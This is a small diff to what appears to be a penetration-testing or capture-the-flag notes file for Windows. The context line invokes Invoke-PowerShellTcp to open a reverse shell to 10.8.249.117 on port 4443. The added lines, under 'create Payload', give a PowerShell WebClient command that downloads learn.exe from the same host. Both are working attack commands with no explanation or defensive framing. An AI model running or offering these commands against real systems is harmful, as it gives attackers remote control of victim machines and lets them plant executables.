@@ -12,3 +12,8 @@ create powershell in windows
   
   Invoke-PowerShellTcp -Reverse -IPAddress 10.8.249.117 -Port 4443
  
+ ## create Payload
+ 
+ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.249.117:8001/learn.exe','learn.exe')"
+ 
+ 
